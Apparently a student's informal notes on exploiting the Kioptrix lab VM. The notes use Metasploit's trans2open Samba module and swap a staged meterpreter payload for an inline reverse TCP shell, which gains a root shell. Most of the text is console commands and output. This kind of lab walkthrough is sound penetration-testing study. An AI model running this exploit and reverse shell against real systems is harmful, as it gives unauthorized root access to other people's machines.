


referring to the kioptrix stuff


so now we know that there's a trans2open exploit

```
msf6 exploit(linux/samba/trans2open) > show options

Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.244.128  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   139              yes       The target port (TCP)


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.244.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce


View the full module info with the info, or info -d command.

msf6 exploit(linux/samba/trans2open) > set RHOST 192.168.244.133
RHOST => 192.168.244.133
```


Looking at the options we set the RHOST and everything correctly, now what do we do? what are we supposed to do? what CANT we do?



```


msf6 exploit(linux/samba/trans2open) > exploit

[*] Started reverse TCP handler on 192.168.244.128:4444 
[*] 192.168.244.133:139 - Trying return address 0xbffffdfc...
[*] 192.168.244.133:139 - Trying return address 0xbffffcfc...
[*] 192.168.244.133:139 - Trying return address 0xbffffbfc...
[*] 192.168.244.133:139 - Trying return address 0xbffffafc...
[*] Sending stage (1017704 bytes) to 192.168.244.133
[*] 192.168.244.133 - Meterpreter session 1 closed.  Reason: Died
[-] Meterpreter session 1 is not valid and will be closed
[*] 192.168.244.133:139 - Trying return address 0xbffff9fc...
[*] Sending stage (1017704 bytes) to 192.168.244.133
[*] 192.168.244.133 - Meterpreter session 2 closed.  Reason: Died
[*] 192.168.244.133:139 - Trying return address 0xbffff8fc...
[*] Sending stage (1017704 bytes) to 192.168.244.133
[*] 192.168.244.133 - Meterpreter session 3 closed.  Reason: Died
[-] Meterpreter session 3 is not valid and will be closed
[*] 192.168.244.133:139 - Trying return address 0xbffff7fc...
[*] Sending stage (1017704 bytes) to 192.168.244.133
[*] 192.168.244.133 - Meterpreter session 4 closed.  Reason: Died
[*] 192.168.244.133:139 - Trying return address 0xbffff6fc...
^C[-] 192.168.244.133:139 - Exploit failed [user-interrupt]: Interrupt 
[-] exploit: Interrupted

```


we can see that hey were connecting which means we can read the IP, we can see that were trying to return the address but theres nothing too so that means we can interact with the address and so now we start testing as we have learnt from the past notes, we are currently using the payload `Payload (linux/x86/meterpreter/reverse_tcp):`   so lets try and find a non-staged payload equivelant


```
msf6 exploit(linux/samba/trans2open) > search payload reverse tcp linux x86

Matching Modules
================

   #   Name                                                      Disclosure Date  Rank     Check  Description
   -   ----                                                      ---------------  ----     -----  -----------
 <.................................snip......................................................>
   24  payload/linux/x86/shell_reverse_tcp                                        normal   No     Linux Command Shell, Reverse TCP Inline
<.................................snip......................................................>
   48  exploit/multi/vpn/tincd_bof                               2013-04-22       average  No     Tincd Post-Authentication Remote TCP Stack Buffer Overflow

```

we can see here that this one is the most viable one and the one that works the most out of all of them, this is very barebones and basic and we can try using it first and laterally move from it

and there we go :))

```
msf6 exploit(linux/samba/trans2open) > set payload payload/linux/x86/shell_reverse_tcp
payload => linux/x86/shell_reverse_tcp
msf6 exploit(linux/samba/trans2open) > exploit

[*] Started reverse TCP handler on 192.168.244.128:4444 
[*] 192.168.244.133:139 - Trying return address 0xbffffdfc...
[*] 192.168.244.133:139 - Trying return address 0xbffffcfc...
[*] 192.168.244.133:139 - Trying return address 0xbffffbfc...
[*] 192.168.244.133:139 - Trying return address 0xbffffafc...
[*] 192.168.244.133:139 - Trying return address 0xbffff9fc...
[*] 192.168.244.133:139 - Trying return address 0xbffff8fc...
[*] 192.168.244.133:139 - Trying return address 0xbffff7fc...
[*] 192.168.244.133:139 - Trying return address 0xbffff6fc...
[*] Command shell session 5 opened (192.168.244.128:4444 -> 192.168.244.133:1037) at 2024-02-20 07:41:34 -0500

[*] Command shell session 6 opened (192.168.244.128:4444 -> 192.168.244.133:1038) at 2024-02-20 07:41:35 -0500
[*] Command shell session 7 opened (192.168.244.128:4444 -> 192.168.244.133:1039) at 2024-02-20 07:41:36 -0500
[*] Command shell session 8 opened (192.168.244.128:4444 -> 192.168.244.133:1040) at 2024-02-20 07:41:37 -0500

```


lets test and see our ID

```
[*] Command shell session 8 opened (192.168.244.128:4444 -> 192.168.244.133:1040) at 2024-02-20 07:41:37 -0500
who ami
whoami
root
id
uid=0(root) gid=0(root) groups=99(nobody)
pwd
/tmp

```